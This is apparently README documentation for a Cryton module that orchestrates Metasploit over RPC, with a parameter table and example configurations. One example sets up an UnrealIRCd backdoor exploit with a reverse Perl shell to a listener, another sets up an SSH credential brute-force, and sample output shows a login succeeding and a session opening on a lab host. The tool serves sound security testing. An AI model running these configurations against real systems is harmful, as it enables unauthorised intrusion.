# mod_msf

Module for orchestrating Metasploit Framework.

## System requirements

For this module to function properly, [Metasploit-framework](https://www.kali.org/tools/metasploit-framework/) needs to be installed.

After a successful installation of Metasploit-framework, you need to load MSFRPCD plugin. Easiest way to do this to open your terminal and run `msfrpcd` with `-P toor` to use password and `-S` to turn off SSL (depending on configuration in Worker config file). 

**Optional:**

Another option is to run Metasploit using `msfconsole` and load msgrpc plugin using this command:

````bash
load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass='toor' SSL=true
````

This is just default, feel free to change the parameters to suit your needs, but keep in mind that they must match your worker config file.

After successfully loading the msgrpc plugin, you are all set and ready to use this module.

## Input parameters

Description of input parameters for module.

| Parameter name    | Required                                | Example value                      | Data type | Default value                                                                                | Parameter description                                                                                                                                                                                                                                                                                                                                                                     |
|-------------------|-----------------------------------------|------------------------------------|-----------|----------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `session_target`  | No                                      | 127.0.0.1                          | string    | default value is taken from Non-case sensitive `RHOSTS` or `RHOST` option in `module_optons` | IP address of the target for matching metasploit session purposes.                                                                                                                                                                                                                                                                                                                        |
| `module_type`     | Yes                                     | exploit                            | string    | -                                                                                            | Type of the msf module (valid values: `exploit`, `post`, `encoder`, `auxiliary`, `nop`, `payload`).                                                                                                                                                                                                                                                                                       |
| `module`          | Yes                                     | unix/irc/unreal_ircd_3281_backdoor | string    | -                                                                                            | Name of metasploit module.                                                                                                                                                                                                                                                                                                                                                                |
| `module_options`  | Yes                                     | {"RHOSTS": "127.0.0.1"}            | dict      | -                                                                                            | Custom dictionary with options for the given module                                                                                                                                                                                                                                                                                                                                       |
| `payload`         | Yes (only for `module_type`: `exploit`) | cmd/unix/reverse_perl              | string    | -                                                                                            | Name of the payload to use in combination with the given module.                                                                                                                                                                                                                                                                                                                          |
| `payload_options` | Yes (only with defined `payload`)       | {"LHOST": "127.0.0.1"}             | dict      | -                                                                                            | Custom dictionary with options for the given payload.                                                                                                                                                                                                                                                                                                                                     |
| `raw_output`      | No                                      | false                              | bool      | true                                                                                         | Flag whether you want to return raw output from Metasploit.                                                                                                                                                                                                                                                                                                                               |
| `wait_for_result` | No                                      | false                              | bool      | true                                                                                         | Boolean value (True or False) whether the module should be executed as background job. If False the module is executed without waiting for the job to finish. Be aware, that then the console output of the module's execution may not be fully captured. If this option is set to True, then the module waits until the job is completed and the output of the module is fully captured. |
| `module_timeout`  | No                                      | 120                                | int       | 300                                                                                          | Number of seconds to wait before the module execution will be terminated.                                                                                                                                                                                                                                                                                                                 |
| `module_retries`  | No                                      | 3                                  | int       | 1                                                                                            | Defines how many times should metasploit module try to be executed, if it didn't finish successfully until the `module_timeout`is reached.                                                                                                                                                                                                                                                |


**NOTICE: To utilize existing sessions check out the [session management](https://cryton.gitlab-pages.ics.muni.cz/cryton-documentation/latest/designing-phase/step/#session-management) feature.**

### Example with payload

```yaml
module_arguments:
  module_type: exploit
  module: unix/irc/unreal_ircd_3281_backdoor
  module_options:
    RHOSTS: CHANGE ME
    RPORT: 6697
  payload: cmd/unix/reverse_perl
  payload_options:
    LHOST: 172.28.128.3
    LPORT: 4444
  exploit_timeout_in_sec: 15
  exploit_retries: 5
```

### Example without payload

```yaml
module_arguments:
  module_type: auxiliary
  module: scanner/ssh/ssh_login
  module_options:
    RHOSTS: CHANGE ME
    USERNAME: vagrant
    PASSWORD: vagrant
```

## Output

Description of module output.

| Parameter name      | Parameter description                                                                                         |
|---------------------|---------------------------------------------------------------------------------------------------------------|
| `return_code`       | 0 - success<br />-1 - fail                                                                                    |
| `output`            | Raw output from Metasploit or any errors that can occur during module execution.                              |
| `serialized_output` | **Only available when the metasploit module creates a session.** Dictionary in form of `{'session_id': '1'}`. |

### Example
```json lines
{
  'return_code': 0, 
  'output': "VERBOSE => True\nBRUTEFORCE_SPEED => 5\nBLANK_PASSWORDS => false\nUSER_AS_PASS => false\nDB_ALL_CREDS => false\nDB_ALL_USERS => false\nDB_ALL_PASS => false\nDB_SKIP_EXISTING => none\nSTOP_ON_SUCCESS => false\nREMOVE_USER_FILE => false\nREMOVE_PASS_FILE => false\nREMOVE_USERPASS_FILE => false\nTRANSITION_DELAY => 0\nMaxGuessesPerService => 0\nMaxMinutesPerService => 0\nMaxGuessesPerUser => 0\nCreateSession => true\nAutoVerifySession => true\nTHREADS => 1\nShowProgress => true\nShowProgressPercent => 10\nRPORT => 22\nSSH_IDENT => SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3\nSSH_TIMEOUT => 30\nSSH_DEBUG => false\nGatherProof => true\nRHOSTS => 192.168.56.51\nUSERNAME => vagrant\nPASSWORD => vagrant\nDisablePayloadHandler => True\n[*] 192.168.56.51:22 - Starting bruteforce\n[+] 192.168.56.51:22 - Success: 'vagrant:vagrant' 'uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant) Linux vagrant-ubuntu-trusty-64 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '\n[!] No active DB -- Credential data will not be saved!\n[*] SSH session 1 opened (192.168.56.50:36169 -> 192.168.56.51:22) at 2022-08-04 17:03:56 +0200\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n",
  'serialized_output': {'session_id': '1'} 
}

```